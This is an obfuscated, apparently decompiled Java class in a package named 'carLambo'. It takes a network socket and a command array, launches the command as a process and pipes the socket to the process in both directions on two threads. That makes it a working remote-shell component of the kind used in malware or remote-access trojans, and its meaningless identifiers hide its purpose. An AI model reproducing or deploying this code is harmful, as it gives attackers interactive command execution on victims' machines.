package carLambo;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.Socket;

public final class dgdfndnbcn {
   private OutputStream sdfsldf;
   private Process sabretb;
   private InputStream dfhttegd;
   private BufferedWriter bsgshsbs;
   private boolean gsbthstgb = true;
   private Socket sfsrgsbd;
   private BufferedReader fgsbsfgsb;

   // $FF: synthetic method
   static void sdfsldf(dgdfndnbcn var0) {
      var0 = var0;

      try {
         label20:
         while(true) {
            dgdfndnbcn var10000 = var0;

            String var1;
            while((var1 = var10000.fgsbsfgsb.readLine()) != null) {
               if (var1.trim().equals("")) {
                  continue label20;
               }

               var1 = (new StringBuilder()).insert(0, var1).append("\n").toString();
               var10000 = var0;
               var0.sdfsldf.write(var1.getBytes());
               var0.sdfsldf.flush();
            }

            var0.gsbthstgb = false;
            var0.fgsbsfgsb.close();
            var0.sdfsldf.close();
            return;
         }
      } catch (Exception var2) {
         System.out.println(var2.getMessage());
      }
   }

   // $FF: synthetic method
   private void sdfsldf() {
      try {
         byte[] var1 = new byte[1024];

         while(this.gsbthstgb) {
            int var2;
            if ((var2 = this.dfhttegd.read(var1, 0, 1024)) == -1) {
               this.gsbthstgb = false;
               this.dfhttegd.close();
               this.bsgshsbs.close();
               return;
            }

            String var4 = (new StringBuilder()).insert(0, new String(var1, 0, var2)).append("\r\n").toString();
            this.bsgshsbs.write(var4);
            this.bsgshsbs.flush();
         }
      } catch (Exception var3) {
         System.out.println(var3.getMessage());
      }

   }

   // $FF: synthetic method
   static void sabretb(dgdfndnbcn var0) {
      var0 = var0;

      try {
         byte[] var1 = new byte[1024];

         while(var0.gsbthstgb) {
            int var2;
            if ((var2 = var0.dfhttegd.read(var1, 0, 1024)) == -1) {
               var0.gsbthstgb = false;
               var0.dfhttegd.close();
               var0.bsgshsbs.close();
               return;
            }

            String var4 = (new StringBuilder()).insert(0, new String(var1, 0, var2)).append("\r\n").toString();
            var0.bsgshsbs.write(var4);
            var0.bsgshsbs.flush();
         }
      } catch (Exception var3) {
         System.out.println(var3.getMessage());
      }

   }

   dgdfndnbcn(Socket var1, String[] var2) {
      try {
         this.dfhttegd = var1.getInputStream();
         this.sdfsldf = var1.getOutputStream();
         ProcessBuilder var4;
         (var4 = new ProcessBuilder(var2)).redirectErrorStream(true);
         this.sabretb = var4.start();
         this.fgsbsfgsb = new BufferedReader(new InputStreamReader(this.sabretb.getInputStream()));
         this.bsgshsbs = new BufferedWriter(new OutputStreamWriter(this.sabretb.getOutputStream()));
         (new Thread(new xnfghdgh(this))).start();
         (new Thread(new xcdghdgdn(this))).start();
      } catch (Exception var3) {
         this.gsbthstgb = false;
      }
   }

   // $FF: synthetic method
   private void sabretb() {
      try {
         label18:
         while(true) {
            dgdfndnbcn var10000 = this;

            String var1;
            while((var1 = var10000.fgsbsfgsb.readLine()) != null) {
               if (var1.trim().equals("")) {
                  continue label18;
               }

               var1 = (new StringBuilder()).insert(0, var1).append("\n").toString();
               var10000 = this;
               this.sdfsldf.write(var1.getBytes());
               this.sdfsldf.flush();
            }

            this.gsbthstgb = false;
            this.fgsbsfgsb.close();
            this.sdfsldf.close();
            return;
         }
      } catch (Exception var2) {
         System.out.println(var2.getMessage());
      }
   }
}
